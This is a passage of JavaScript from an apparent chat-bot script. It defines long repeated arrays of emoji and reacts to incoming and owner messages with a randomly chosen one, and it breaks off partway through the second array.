                const reactions = ['😊', '🫟', '🫟', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '??', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];

                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
                m.react(randomReaction);
            }
        }

        // Owner React
        if (!isReact && senderNumber === botNumber) {
            if (config.OWNER_REACT === 'true') {
                const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', 